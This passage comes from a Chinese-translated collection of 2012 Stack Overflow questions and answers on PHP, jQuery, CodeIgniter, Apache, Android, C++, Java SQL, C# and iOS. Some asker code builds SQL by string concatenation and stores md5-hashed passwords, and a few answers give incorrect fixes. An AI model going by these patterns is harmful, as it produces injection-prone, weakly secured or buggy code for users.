                            break;
                       }   
                $contents .= $data;
                } while(true);
            } else { return false; }
    fclose ($handle);

    $im = ImageCreateFromString($contents);
    if (!$im) { return false; }
    $gis[0] = ImageSX($im);
    $gis[1] = ImageSY($im);
    // array member 3 is used below to keep with current getimagesize standards
    $gis[3] = "width={$gis[0]} height={$gis[1]}";
    ImageDestroy($im);
    return $gis;                                                                                                                                                       
   }   
$image_url = "http://xample.com/4.jpg";
$get = getimagesize($image_url);
print $get;

?> 
```

但是在执行此 php 代码后，我收到以下错误

```
Fatal error: Cannot redeclare getimagesize() in C:\wamp\www\test\CheckWH.php on line 25 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:37:10.390

PHP 中已经有一个称为 getImageSize 的标准方法。重命名您的方法，一切都很好。

[http://php.net/manual/en/function.getimagesize.php](http://php.net/manual/en/function.getimagesize.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:41:10.377

您可以使用 php 中的标准方法 getimagesize()

```
list($width, $height) = getimagesize("http://xample.com/4.jpg"); 
echo "$width x $height (px)"; 
```

# jquery - jQuery Transit 动画在 Firefox 或 IE 中不起作用

> ID：13514891
> 
> 赞同：0
> 
> 时间：2012-11-22T14:33:57.300
> 
> 标签：jquery, css, jquery-plugins, css-transitions, jquery-transit

我一直在尝试使用位于以下位置的 jQuery 中转缓动类： [http ://ricostacruz.com/jquery.transit/](http://ricostacruz.com/jquery.transit/)

我已经建立了 4 个 .class 元素的简单链接，我从一个位置移动到另一个位置。这在 Crome 中运行良好 - 但是在 Firefox + IE 中没有动画。

我在我的虚拟 FB 应用程序页面上对此进行了测试： [https ://www.facebook.com/pages/Dette-er-en-test/186656608020464?sk=app_379428358804869](https://www.facebook.com/pages/Dette-er-en-test/186656608020464?sk=app_379428358804869)

我的序列链接设置如下：

```
<script>
$(document).ready(function()
  {
  $('.box1').hide();
  $('.box2').hide();
  $('.box3').hide();
  $('.box4').hide();

  $("#btn1").click(function(){
    $('.box1').show();
    $('.box2').show();
    $('.box3').show();
    $('.box4').show();

      $('.box1').
        css({ y: '+400px' }).
        transition({ y: -35 }, 350, 'out').
        transition({ y: 0 }, 150, 'in');
      $('.box2').
        css({ y: '+400px' }).
        transition({ y: -35, delay: 350}, 350, 'out').
        transition({ y: 0, }, 150, 'in');
      $('.box3').
        css({ y: '+400px' }).
        transition({ y: -35, delay: 700}, 350, 'out').
        transition({ y: 0, }, 150, 'in');
      $('.box4').
        css({ y: '+400px' }).
        transition({ y: -35, delay: 1050}, 350, 'out').
        transition({ y: 0, }, 150, 'in');
  });
});
</script> 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T19:54:41.353

不确定它有多优雅，但是我设法用纯 jQuery 解决了它。以下是一连串动画，我将一个元素移动到一个位置，然后为同一元素运行一个函数，使其最终到达最终位置。

我基本上只是在同一设置中对我的所有 4 个元素重复了步骤

```
<script src="js/jquery-1.8.2.js"></script>
<script src="js/jquery-ui-1.9.1.custom.js"></script>
<script>
    $(document).ready(function()
      {
          $('#j1').animate({
            top: '-170'
          }, {
            duration: 300,
            specialEasing: {
              height: 'easeOut'
            },
            complete: function() {
              $(this).after(end1());
            }
          });
    });

function end1(){
          $('#j1').animate({
            top: '-145'
          }, {
            duration: 100,
            specialEasing: {
              height: 'easeIn'
            },
            complete: function() {
              $(this).after(j2Start());
            }
          });
}
function j2Start(){
          $('#j2').animate({
            top: '-170'
          }, {
            duration: 300,
            specialEasing: {
              height: 'easeOut'
            },
            complete: function() {
              $(this).after(j2End());
            }
          });
}
function j2End(){
          $('#j2').animate({
            top: '-145'
          }, {
            duration: 100,
            specialEasing: {
              height: 'easeIn'
            },
            complete: function() {
              $(this).after(j3Start());
            }
          });
} 
```

# php - 如何阻止重复条目进入我的会员数据库？

> ID：13514903
> 
> 赞同：0
> 
> 时间：2012-11-22T14:34:37.077
> 
> 标签：php, codeigniter

我正在使用表单验证功能——它目前不允许用户在创建帐户时输入错误的用户名和密码参数。但这意味着将用户弹回注册屏幕。相反，它们被带到主屏幕，如果我使用在进入数据库之前已经使用过的用户名。

注册控制器：

```
class Signup extends CI_Controller {

    function Signup() {
        parent::__construct();
        $this->load->model('membership');
    }

    function index() {
        $this->load->view('shared/header');
        $this->load->view('account/signuptitle');
        $this->load->view('account/signupview');
        $this->load->view('shared/footer');
    }

    function register() {

        $this->load->helper(array('form', 'url'));

        $this->load->library('form_validation');

        $this->form_validation->set_rules('username', 'Username', 'required|min_length[5]|max_length[12]|trim');
        $this->form_validation->set_rules('password', 'Password', 'required|md5|trim');
        $this->form_validation->set_rules('username', 'Username', 'callback_usernameTaken');

        $username = $this->input->post('username');
        $password = $this->input->post('password');

        if ($this->form_validation->run()) {

        $this->membership->newUser($username, $password);
        $this->session->set_userdata('status', 'OK');
        $this->session->set_userdata('username', $username);
        redirect('home');
        }

        if ($this->membership->usernameTaken($username)) {
        $this->load->view('shared/header');
        $this->load->view('account/signuptitle');
        $this->load->view('account/signupview');
        $this->load->view('shared/footer');
        } else {
        $this->load->view('shared/header');
        $this->load->view('account/signuptitle');
        $this->load->view('account/signupview');
        $this->load->view('shared/footer');
        }
    }

} 
```

我认为该`if ($this->membership->usernameTaken($username))`语句需要以某种方式安排它可能是一个 else if 语句吗？

会员模式：

```
class Membership extends CI_Model {

    function Membership() {
        parent::__construct();
    }

    function newUser($username, $password) {
        $newMember = array('username' => $username,
        'password' => $password);
        $insert = $this->db->insert('membership', $newMember);
    }

    function usernameTaken($username) {
        $this->db->select('*')->from('membership')->where('username', $username);
        $query = $this->db->get();
        if ($query->num_rows > 0) {
        return true;
        } else {

        return false;
        }
    } 
```

再次感谢大家的帮助——我一直在这个网站上查看类似的问题，但我发现它们太混乱了

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T15:33:12.650

我会说将这些视图放在模板中，然后您可以加载该模板。它使事情看起来更整洁。您的索引函数应如下所示

```
 function index() {
    $data['page_title'] = 'Sign up page';
    $data['central_content'] = "sign_up";
    $this->load->view('template');  
} 
```

在您的模板中不要忘记加载内容，就像这样；

```
<?php $this->load->view($central_content);  ?> 
```

重新排列您的注册功能，如下所示；

```
function register() {
    #you should be autoloading these helpers tbh

    $this->load->helper(array('form', 'url'));

    $this->load->library('form_validation');

    $this->form_validation->set_rules('username', 'Username', 'required|min_length[5]|max_length[12]|trim');
    $this->form_validation->set_rules('password', 'Password', 'required|md5|trim');
    $this->form_validation->set_rules('username', 'Username', 'callback_usernameTaken');

    if ($this->form_validation->run()) {

    $username = $this->input->post('username');
    $password = $this->input->post('password');
    #Learn to use flashdata, it helps.

    if($this->membership->newUser($username, $password)){
       $this->session->set_userdata('status', 'OK');
       $this->session->set_userdata('username', $username);
       redirect('home');
    }

    }else{

     $this->index();
     }

}

#You specified a callback but there's no callback function in your class? Here's how you go about it.
Public function usernameTaken(){
 #callbacks should return true or false
    if ($this->membership->usernameTaken($username)) {
    return true;
    } else {
#You can set your own validation message in the case it's false.
$this->form_validation->set_message('usernameTaken', 'The selected username already exists');
return false;

    }
} 
```

你的模型没问题，试试把函数改成这个

```
 function newUser($username, $password) {
      $newMember = array('username' => $username,
      'password' => $password);
      return ($this->db->insert('membership', $newMember)) ? true : false;
}
function usernameTaken($username) {
   #your query, requires a select * in a case where it's clearly not needed. Little things like this slow down your query.Try,
    $query = $this->db->where('username', $username)->get('membership');
    #Also num_rows()
    return ($query->num_rows() > 0) ? false : true;

} 
```

刚写在这里，所以你必须测试一下，但我相信它应该没问题。抱歉，我无法正确缩进，在这里做这件事很痛苦:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:51:34.010

我相信当注册函数运行时，只有这部分代码在重定向之前被执行。

```
if ($this->form_validation->run()) {

    $this->membership->newUser($username, $password);
    $this->session->set_userdata('status', 'OK');
    $this->session->set_userdata('username', $username);
    redirect('home');
    } 
```

尝试做这样的事情。

if ($this->form_validation->run() && !$this->membership->usernameTaken($username)) {

```
 $this->membership->newUser($username, $password);
    $this->session->set_userdata('status', 'OK');
    $this->session->set_userdata('username', $username);
    redirect('home');
    } 
```

这样它就不会重定向并继续执行它下面的行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:42:15.273

表单验证可能无法访问模型。尝试移动`usernameTaken($username)`到控制器。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-22T14:49:55.290

我想你每次都在插入。

```
if (! $this->membership->usernameTaken($username)) 
{
  $this->membership->newUser($username, $password);
} 
```

# apache - 忽略重写目录无法正常工作

> ID：13514904
> 
> 赞同：0
> 
> 时间：2012-11-22T14:34:39.340
> 
> 标签：apache, mod-rewrite, rewrite

我有一个奇怪的情况，规则在具有相同主机的不同域上工作，但它不适用于特定域。

我有 2 个 Bluehost 帐户，它们是标准的廉价共享托管服务提供商。

在帐户 #1 我有一个托管帐户，其中有 4 个域名。1 个域是主域（加载帐户的 /public_html/ 目录）和 3 个附加域，它们只是 /public_html/ 中的文件夹。

在帐户 #1 我的 .htaccess 文件中有这个：

```
RewriteCond %{REQUEST_FILENAME} !-d 
```

它位于我忽略重写一些文件扩展名的正下方，之后我有一堆 url 重写规则，它们都在工作。

在帐户＃1这一切都很好。

在帐户 #2 上，我有完全相同的设置，但附加域在访问它们时会抛出错误 500，它也不会在文件的文件夹中添加 error.log 条目，我在没有重写的情况下测试了域，它工作正常. 它们可以通过标准 url (www.example.com) 访问，因此它不像是子域或任何东西。

在这种情况下，这个附加域是非常基本的。它只是一个没有重写规则的单页域。如果我从主域中删除 .htaccess，那么子域就可以工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:38:18.750

嗯，那很快。在附加域中，我没有 .htaccess 文件。我认为这没关系，因为我没有进行任何重写。

显然它不是那样工作的。我在该附加域的文件夹中添加了一个 .htaccess 并像往常一样将其添加到顶部：

```
RewriteEngine On 
```

现在两个域都按预期工作。

# android - 每天只更新一次

> ID：13514907
> 
> 赞同：1
> 
> 时间：2012-11-22T14:34:44.457
> 
> 标签：android, date

我的 Android 应用程序中有一些东西需要每天更新一次。

我认为这很简单，但我不知道我需要什么格式来格式化日期和时间（如果需要时间）以及如何检查今天是否完成了更新（今天是在上午 00:01 到 23 之间：用户当地时间下午 59 点）。如果今天已经完成更新，则不应进行更新。

这就是我知道该怎么做：

*   将上次更新日期保存在 SharedPreferences 中（但我如何获取它的字符串，我不知道）
*   从 SharedPreferences 获取东西（但我不知道如何比较字符串格式的日期）

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-22T14:44:13.773

这与您选择的格式无关。这只是重新计算的问题。

我建议使用自纪元以来的毫秒数，因为所有系统调用都使用它，因此您使用它会更容易。

由于 1000 毫秒是 1 秒，因此很容易算出`1000*60*60*24`等于一天（24 小时）。因此，如果`storedMillis`大于`NOW - 1000*60*60*24`,（并且`NOW`是 ie `System.currentTimeMillis()`），那么现在进行检查还为时过早。如果`storedMillis`较小，则保存您的`NOW`时间戳并进行检查：

```
long now = System.currentTimeMillis();
long diffMillis = now - lastCheckedMillis;
if( diffMillis >= (3600000  * 24) ) {
  // store now (i.e. in shared prefs)

  // do the check
} else {
   // too early
} 
```

**编辑**

> 我有兴趣在当天首次打开应用程序时执行此操作，即使最后一次更新是在 10 分钟前完成的。

这只是如何获得合适的毫来比较的问题。`long now = System.currentTimeMillis();`用以下代码块替换上面的代码：

```
Calendar cal = Calendar.getInstance();
cal.clear(Calendar.HOUR);
cal.clear(Calendar.HOUR_OF_DAY);
cal.clear(Calendar.MINUTE);
cal.clear(Calendar.SECOND);
cal.clear(Calendar.MILLISECOND);

long now = cal.getTimeInMillis(); 
```

这应该可以解决问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T14:40:24.053

如果您以 20121122 (YYYYmmdd) 格式存储日期，那么您可以比较 20121122 > 20121123。但在比较时必须将其存储为 int 或强制转换为 int。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-22T14:42:41.423

存储上次执行的时间戳 (System.currentTimeMillis() ) 并将其与当前执行进行比较。如果差值超过 24 小时……你知道吗？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-22T14:45:30.103

使用每 24 小时执行一次的 AlarmManager 设置警报，然后执行操作

检查这个问题：[警报管理器示例](https://stackoverflow.com/questions/4459058/alarm-manager-example)

这是一种比其他方法更复杂的方法，但可以确保事情已经完成，而使用其他选项时，必须执行应用程序以检查它是否需要更新任何内容。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-10-31T11:58:16.730

这是方法

```
public boolean runOnceADay() {
    SharedPreferences shp= c.getSharedPreferences(Constants.GENERAL_SHP, MODE_PRIVATE);
    SharedPreferences.Editor editor= shp.edit();
    long lastCheckedMillis = shp.getLong(Constants.ONCE_A_DAY, 0); // "KEY" you may change yhe value
    long now = System.currentTimeMillis();
    long diffMillis = now - lastCheckedMillis;
    if (diffMillis >= (3600000 * 24)) { // set up your time circulation
         editor.putLong(Constants.ONCE_A_DAY, now);
        editor.commit();
        Util.showMessage(c, "Once a Day Test");
        return false;
     } else {
        Util.showMessage(c, "Too Early");
        return true;
    }
} 
```

# jquery - jQuery 在其他设置为 false 之前设置为 true 时不会获取检查的输入

> ID：13514909
> 
> 赞同：1
> 
> 时间：2012-11-22T14:34:49.257
> 
> 标签：jquery, undefined, radio, selected

我看到 jQuery 的一个有趣的行为，我不知道为什么，现在它不是一个真正的问题，因为我“修复”了它，但我想和你分享这个，看看代码：

```
 switch(id){
            case "1k":
                check5k.attr('checked', false);
                check10k.attr('checked', false);
                check1k.attr('checked', true);
                image1k.attr('class', 'radio-checked1k');
                image5k.attr('class', 'radio5k');
                image10k.attr('class', 'radio10k');
                break;
            case "5k":
                check1k.attr('checked', false);
                check10k.attr('checked', false);
                check5k.attr('checked', true);
                image1k.attr('class', 'radio1k');
                image5k.attr('class', 'radio-checked5k');
                image10k.attr('class', 'radio10k');
                break;
            case "10k":
                check1k.attr('checked', false);
                check5k.attr('checked', false);
                check10k.attr('checked', true);
                image1k.attr('class', 'radio1k');
                image5k.attr('class', 'radio5k');
                image10k.attr('class', 'radio-checked10k');
                break;
        } 
```

所以，它有效，当我尝试时`alert($("input:checked").val())`，它会显示当前选择的单选值，但是，如果我这样做：

```
 switch(id){
            case "1k":
                check1k.attr('checked', true);
                check5k.attr('checked', false);
                check10k.attr('checked', false);
                image1k.attr('class', 'radio-checked1k');
                image5k.attr('class', 'radio5k');
                image10k.attr('class', 'radio10k');
                break;
            case "5k":
                check1k.attr('checked', false);
                check5k.attr('checked', true);
                check10k.attr('checked', false);
                image1k.attr('class', 'radio1k');
                image5k.attr('class', 'radio-checked5k');
                image10k.attr('class', 'radio10k');
                break;
            case "10k":
                check1k.attr('checked', false);
                check5k.attr('checked', false);
                check10k.attr('checked', true);
                image1k.attr('class', 'radio1k');
                image5k.attr('class', 'radio5k');
                image10k.attr('class', 'radio-checked10k');
                break;
        } 
```

并尝试使其`alert($("input:checked").val())`仅显示 10k id 的值，其他显示未定义。10k 显示该值，因为在这种情况下它是最后一个设置为 true 的值。

为什么会这样？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:40:53.363

您将选中的属性设置错误。在 jQuery 中，您`.attr('checked', 'checked')`可以设置它并`.removeAttr('checked')`取消设置它。*

*在 jQuery 1.6 之前。在 1.6 之后，您使用[prop](http://api.jquery.com/prop/)。

# c++ - std::multiset的模板参数A,B是什么意思分别，它是如何工作的？

> ID：13514910
> 
> 赞同：7
> 
> 时间：2012-11-22T14:34:52.003
> 
> 标签：c++, stl, multiset

我在另一个关于**std::multiset**的问题中问过，但现在我发现我需要一个体面的理解，并且在互联网上找不到任何更复杂的例子。

你能向我解释一下，也许可以举例说明`std::multiset<A,B>`，A 和 B 的工作原理和功能是什么，以及是否可以省略其中的任何一个？我可以将 A 或 B 放入某个变量吗？我真的很感激一些简短的例子或参考，

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-11-22T14:38:23.330

[`std::multiset`](http://en.cppreference.com/w/cpp/container/multiset)类模板具有第一个模板参数，指定要存储在集合中的对象的类型，第二个模板参数指定比较函子的类型。我们现在可以忽略第三个模板参数。

第二个，可选参数，`B`必须实现[严格的弱排序](http://www.sgi.com/tech/stl/StrictWeakOrdering.html)，用于对集合/多重集合进行排序。需要这种排序以确保元素查找操作的对数复杂性。这是一个例子：

```
struct A
{
  int x;
};

struct B
{
  bool operator()(const A& lhs, const A& rhs) const {
    return lhs.x < rhs.x;
  }
}; 
```

这个类`B`有一个`operator()`，这意味着它可以被调用，例如

```
B comp;
A a1, a2;
bool a1lessThana2 = comp(a1, a2); 
```

set/multiset 需要将元素放置在正确的位置，并确定两个元素是否相同。如果`operator<`您的类型有一个，则可以省略第二个模板参数。

```
bool operator<(constA& lhs, const A& rhs) { return lhs.x < rhs.x; } 
```

这是一个使用示例：

```
int main()
{
  std::multiset<A, B> m;
  A a1, a2;
  a1.x = 23;
  a2.x = 100;
  m.insert(a1);
  m.insert(a2);
} 
```

# java - 列计数与第 1 行的值计数不匹配 - Java SQL

> ID：13514912
> 
> 赞同：0
> 
> 时间：2012-11-22T14:35:06.190
> 
> 标签：java, mysql, database

我收到“列计数与第 1 行的值计数不匹配”，但我似乎无法修复它。我尝试更改引号和数据类型，但仍然没有运气。谁能看到我哪里出错了？

```
public void actionPerformed(ActionEvent arg0) {
            if(!textField.getText().isEmpty() && !textField_1.getText().isEmpty() && !textField_2.getText().isEmpty() && !textField_3.getText().isEmpty() && !textField_4.getText().isEmpty() && !textField_5.getText().isEmpty() && !textField_6.getText().isEmpty() && !textField_7.getText().isEmpty())
            {
                String moduleName = textField.getText();
                String studId = textField_1.getText();
                String sFName = textField_2.getText();
                String sLName = textField_3.getText();
                int weekNo = Integer.parseInt(textField_4.getText());
                int lAttend = Integer.parseInt(textField_5.getText());
                int tAttend = Integer.parseInt(textField_6.getText());
                int wAttend = Integer.parseInt(textField_7.getText());

                lh.addStud(moduleName, studId, sFName, sLName , weekNo, lAttend, tAttend, wAttend);
            }
            else
            {
                lblNewLabel_4.setText("You have Missing Field");
            }
            fillDB();
           }
        }); 
```

以下是我的查询：

```
String aSQuery = "INSERT INTO Group6_Register VALUES ('" + moduleName + "', '" + studId + "', '" + sFName + "', '" +  sLName +"', '" +  weekNo + "', '" +  lAttend + "', '"  + tAttend + "', '" + wAttend + "')";
            statements = connection.prepareStatement(aSQuery);
            statements.executeUpdate(); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T14:38:17.637

> “列计数与第 1 行的值计数不匹配”

通常在 values 子句中定义的列与您的实际表列不匹配时发生。

说你的桌子有 4 列，**col1 col2 col3 col4**

现在您只想将数据插入**col2、col3、col4**

你的插入语句应该是

```
Insert into table (col2, col3, col4) values(col2val, col3val, col3val) 
```

但是，我**强烈**建议您在**使用 JDBC 执行 sql 查询**时使用[**PreparedStatement**](http://docs.oracle.com/javase/6/docs/api/java/sql/PreparedStatement.html)。

 **```
 String query= "Insert into table (col2, col3, col4) Values(?,?,?)";
   Statement st = conn.preparedStatement(query);
   st.setString(1, col2value);
   st.setString(2, col3Val); 
   st.setString(3, col4Val); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:40:21.937

只需定义您明确插入的列

```
INSERT INTO table (col1,col2,coln) VALUES ( val1, val2, val3 ) 
```

否则，您必须为每个字段设置一个值

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:38:06.387

发生这种情况是因为您使用的是*隐式*类型的`INSERT`语句。服务器期望您已经为所有列提供了所有值，但您没有这就是它引发异常的原因。

最好的方法是显式声明值绑定到的列名，例如。

```
INSERT INTO tableName (colA, colB, colC)
VALUES ('a','b','c') 
```

*当您为所有*列指定了所有值时，您只能使用这种类型的语法，例如，您有一个包含*3 列*的表，然后您可以使用它

```
INSERT INTO tableName  VALUES ('a','b','c') 
```**

# c# - 如果带有 listView 的语句：只写入一列？

> ID：13514917
> 
> 赞同：0
> 
> 时间：2012-11-22T14:35:19.410
> 
> 标签：c#, winforms, listview

我想要做的是只用 if 语句写入我的 listView 的第 5 列。

我正在检查某个文本是否出现在 Googoel 中，然后将 Yes 放在文本出现的行中。如果否，则在文本未出现的行中输入“否”。

这是我所拥有的，但它`InvalidArgument=Value of '24' is not valid for 'index'. Parameter name: index`在 else 语句中的 No 部分不断出错。：

```
string google2 = http.get("https://www.google.com/search?q=" + textBox1.Text + "");
string[] embedid = getBetweenAll(vid, "type='text/html' href='http://www.youtube.com/watch?v=", "&amp;feature=youtube_gdata'/>");

for (int i = 0; i < embedid.Length; i++)
{
    if (google2.Contains(embedid[i]))
    {
        listView1.Items[i].SubItems.Add("Yes");
    }
    else
    {
        listView1.Items[i].SubItems.Add("No");
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:41:05.540

更改`embedid.Length`为`embedid.Length - 1`。

如果您有 5 个项目使用`Length`，则计数将为 5，但是当索引 5 个项目时，您将需要有，`-1`因为您从`0-4`as apose 索引到`1-5`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T14:43:55.037

我认为这会做到：

```
listView1.Items[i].SubItems.Item[4] = google2.Contains(embedid[i]) ? "Yes" : "No" 
```

# iphone - CSS 背景精灵对于 iPhone 来说太大了

> ID：13514919
> 
> 赞同：4
> 
> 时间：2012-11-22T14:35:27.117
> 
> 标签：iphone, css, safari, responsive-design, css-sprites

我有一个尺寸为 2000x2000 像素的 css 背景精灵表。在所有桌面浏览器中都可以正常工作，但在 Safari for iPhone 上它根本不呈现。

将尺寸降低到 1000x1000 使其渲染完美。（好吧，除了我现在错过了精灵表的四分之三的事实）。

背景图像的尺寸是否有任何限制？2000x2000 并不是那么大。试图绕过重做大量 css 定位的工作。

此外，我正在使用媒体查询布局（最大宽度，而不是最大设备宽度）。但我仍然使用相同的图形。

编辑：啊，是的，它在 Android 设备上运行得很好。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-22T14:42:35.867

我们在 iPad 和 iPhone 上遇到了同样的问题。最安全的选择是使用 1024x1024 像素或更少。最终我们不得不将精灵表分成两部分并再次进行 CSS。

根据[http://www.glbenchmark.com/](http://www.glbenchmark.com/)和[http://developer.apple.com/library/ios/#documentation/3DDrawing/Conceptual/OpenGLES_ProgrammingGuide/OpenGLESPlatforms/OpenGLESPlatforms.html](http://developer.apple.com/library/ios/#documentation/3DDrawing/Conceptual/OpenGLES_ProgrammingGuide/OpenGLESPlatforms/OpenGLESPlatforms.html)

```
Device                              Maximum texture size
iPod Touch                           1024 x 1024
iPod Touch (Second Generation)       1024 x 1024
iPod Touch (Third Generation)        2048 x 2048
iPod Touch (Fourth Generation)       2048 x 2048
iPhone                               1024 x 1024
iPhone 3G                            1024 x 1024
iPhone 3GS                           2048 x 2048
iPhone 4                             2048 x 2048
Samsung GT-i9100 Galaxy S2           4096 x 4096
Google Nexus S                       2048 x 2048
HTC EVO 4G+                          4096 x 4096
HTC Vision (Desire Z)                4096 x 4096
LG P990 Optimus 2X                   2048 x 2048
HTC G1                               1024 x 1024
Barnes & Noble Nook color            2048 x 2048 
```

来源：[http ://hellomobiledevworld.blogspot.co.uk/2011/09/sprite-sheets-and-maximum-texture-size.html](http://hellomobiledevworld.blogspot.co.uk/2011/09/sprite-sheets-and-maximum-texture-size.html)

# iphone - 自动调整自定义 UIAlertView

> ID：13514929
> 
> 赞同：1
> 
> 时间：2012-11-22T14:36:14.067
> 
> 标签：uialertview自定义, iphone, objective-c, ios, custom-controls, uialertview

我做了一个自定义的 UIAlertView，看起来像这样

[http://www.odlgs.com/customAlertBefore.jpg](http://www.odlgs.com/customAlertBefore.jpg)

问题是当我旋转到另一个界面方向时，警报会改变它的大小，看起来像这样：

[http://www.odlgs.com/customAlertAfter.jpg](http://www.odlgs.com/customAlertAfter.jpg)

我制作了一个 NSNotification，它允许我在切换到另一个界面方向时调整控件的大小，但不适用于我的 UIAlertView，并且 autoresizingMask 属性也不起作用，有遇到同样问题或有一些想法的人吗？这是代码：

```
/*** THIS IS THE CLASS OF MY CUSTOM ALERTVIEW ***/
#import "AlertTableViewController.h"
#import "Theme.h"
@implementation AlertTableViewController
@synthesize  textField, caller, context, data;

-(id)initWithCaller:(id)_caller data:(NSArray*)_data title:(NSString*)_title andContext:(id)_context{
    NSMutableString *messageString = [NSMutableString stringWithString:@"\n"];
    tableHeight = 0;
    if([_data count] != 0){
        for(int i = 0; i < [_data count]; i++){
            //[messageString appendString:@"\n\n"];
            //tableHeight += 53;
            tableHeight = 150;
        }
    }else{
        //messageString = @"\n\n\n\n\n\n\n\n\n\n";
        tableHeight = 207;
    }

    if(self = [super initWithTitle:_title message:messageString delegate:self cancelButtonTitle:nil otherButtonTitles:nil]){
        self.caller = _caller;
        self.context = _context;
        self.data = _data;
        [self prepare];
    }
    return self;
}

- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex{
    [self.caller didSelectRowAtIndex:-1 withContext:self.context];
}

-(void)show{
    self.hidden = YES;
    [NSTimer scheduledTimerWithTimeInterval:0.5 target:self selector:@selector(myTimer:) userInfo:nil repeats:NO];
    [super show];
}

-(void)myTimer:(NSTimer*)_timer{
    self.hidden = NO;
    [myTableView flashScrollIndicators];
}

//HERE I ADD THE CONTROLS TO MY CUSTOM ALERTVIEW
-(void)prepare{
    self.autoresizingMask = UIViewAutoresizingFlexibleHeight;
    textField = [[UITextField alloc] initWithFrame:CGRectMake(11, 50, 261, 30)];
    textField.backgroundColor = [UIColor whiteColor];

    textField.delegate = self;
    myTableView = [[UITableView alloc] initWithFrame:CGRectMake(11, 115, 261, tableHeight) style:UITableViewStylePlain];
    myTableView.scrollEnabled = NO;

    myTableView.delegate = self;
    myTableView.dataSource = self;

    UILabel *sourcesTitle = [[UILabel alloc] initWithFrame:CGRectMake(11, 90, 261, 20)];
    sourcesTitle.text = @"Source";
    sourcesTitle.textColor = [UIColor whiteColor];
    sourcesTitle.backgroundColor = [UIColor clearColor];
    sourcesTitle.font  = [UIFont fontWithName:kLKTtFONT_NAME size:kLKTtFONT_LABEL_SIZE_17];
    UIButton *ok = [UIButton buttonWithType:UIButtonTypeRoundedRect];
    ok.frame = CGRectMake(11, 280, 120, 30);
    [ok setTitle:@"Ok" forState:UIControlStateNormal];
    [ok addTarget:self action:@selector(saveNetwork) forControlEvents:UIControlEventTouchDown];

    UIButton *cancel = [UIButton buttonWithType:UIButtonTypeRoundedRect];
    cancel.frame = CGRectMake(150, 280, 120, 30);
    [cancel setTitle:@"Cancel" forState:UIControlStateNormal];
    [cancel addTarget:self action:@selector(cancel) forControlEvents:UIControlEventTouchDown];

    [self addSubview:sourcesTitle];
    [self addSubview:ok];
    [self addSubview:cancel];
    [self addSubview:myTableView];
    [self addSubview:textField];

    [textField becomeFirstResponder];

    UIImageView *imgView = [[[UIImageView alloc] initWithFrame:CGRectMake(11, 50, 261, 4)] autorelease];
    imgView.image = [UIImage imageNamed:@"top.png"];
    [self addSubview:imgView];

    imgView = [[[UIImageView alloc] initWithFrame:CGRectMake(11, tableHeight+46, 261, 4)] autorelease];
    imgView.image = [UIImage imageNamed:@"bottom.png"];
    [self addSubview:imgView];

    CGAffineTransform myTransform = CGAffineTransformMakeTranslation(0.0, 10);
    [self setTransform:myTransform];
}

-(void)saveNetwork{
    CreateNetworkCommunication *communication = [[CreateNetworkCommunication alloc] init];
    communication.sourceId = [[[data objectAtIndex:selectedSource] valueForKey:@"Id"] integerValue];
    communication.name = textField.text;
    communication.delegate = self;
    [communication doRequest];
}

-(void)finishSaveNetworkRequestWithResponse:(OwnerResult*)response{
    if (response.StatusCode == 0) {

        [super dismissWithClickedButtonIndex:0 animated:YES];
        [self.caller refreshNetworks];
    }
    else {
        UIAlertView *error = [[UIAlertView alloc] initWithTitle:self.title message:NSLocalizedString(@"alert.error-saving", nil) delegate:nil cancelButtonTitle:NSLocalizedString(@"OK", nil) otherButtonTitles: nil];
        [error show];
        [error release];
    }
}

-(void)cancel{
    [super dismissWithClickedButtonIndex:1 animated:YES];
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath{
    UITableViewCell *cell = (UITableViewCell*) [tableView dequeueReusableCellWithIdentifier:@"ABC"];
    if (cell == nil) {
        cell = [[[UITableViewCell alloc] initWithFrame:CGRectZero reuseIdentifier:@"ABC"] autorelease];
        cell.selectionStyle = UITableViewCellSelectionStyleNone;
        cell.font = [UIFont boldSystemFontOfSize:14];
    }

    if (selectedSource != indexPath.row)
        cell.accessoryType = UITableViewCellAccessoryNone;

    cell.textLabel.text = [[data objectAtIndex:indexPath.row] valueForKey:@"Name"];
    return cell;
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath{
    //[self dismissWithClickedButtonIndex:0 animated:YES];
    //[self.caller didSelectRowAtIndex:indexPath.row withContext:self.context];
    UITableViewCell *cell = [tableView cellForRowAtIndexPath:indexPath];
    selectedSource = indexPath.row;

    [tableView cellForRowAtIndexPath:indexPath];

    cell.accessoryType = UITableViewCellAccessoryCheckmark;
}

- (void)tableView:(UITableView *)tableView didDeselectRowAtIndexPath:(NSIndexPath *)indexPath{

    UITableViewCell *cell = [tableView cellForRowAtIndexPath:indexPath];
    selectedSource = indexPath.row;
    cell.accessoryType = UITableViewCellAccessoryNone;

}
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return [data count];
}

-(void)dealloc{
    self.data = nil;
    self.caller = nil;
    self.context = nil;
    [myTableView release];
    [super dealloc];
}

